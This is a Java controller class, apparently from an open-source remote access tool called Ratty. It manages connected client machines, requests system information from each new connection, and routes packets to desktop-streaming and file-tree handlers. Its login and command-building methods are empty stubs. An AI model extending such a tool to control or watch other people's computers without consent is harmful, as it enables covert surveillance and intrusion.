package de.sogomn.rat.server.gui;

import java.util.ArrayList;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.IConnectionObserver;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.IServerObserver;

public final class RattyGuiController implements IServerObserver, IConnectionObserver, IGuiController {
	
	private RattyGui gui;
	
	private ArrayList<ServerClient> clients;
	
	public RattyGuiController(final RattyGui gui) {
		this.gui = gui;
		
		clients = new ArrayList<ServerClient>();
		
		gui.addListener(this);
	}
	
	private void logIn(final ServerClient client, final InformationPacket packet) {
		
	}
	
	private IPacket getPacket(final String command, final ServerClient client) {
		IPacket packet = null;
		
		return packet;
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			client.displayController.handlePacket(packet);
			client.fileTreeController.handlePacket(packet);
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final ServerClient client = getClient(connection);
		
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
		
		connection.setObserver(null);
		connection.close();
		
		clients.remove(client);
		gui.removeRow(client);
	}
	
	@Override
	public synchronized void connected(final ActiveServer server, final ActiveConnection connection) {
		final ServerClient client = new ServerClient(connection);
		final InformationPacket packet = new InformationPacket();
		
		connection.setObserver(this);
		clients.add(client);
		connection.start();
		connection.addPacket(packet);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		//...
	}
	
	@Override
	public void userInput(final String command) {
		final ServerClient client = gui.getLastServerClientClicked();
		final IPacket packet = getPacket(command, client);
		
		if (packet != null) {
			client.connection.addPacket(packet);
		}
	}
	
	public ServerClient getClient(final ActiveConnection connection) {
		for (final ServerClient serverClient : clients) {
			if (serverClient.connection == connection) {
				return serverClient;
			}
		}
		
		return null;
	}
	
}
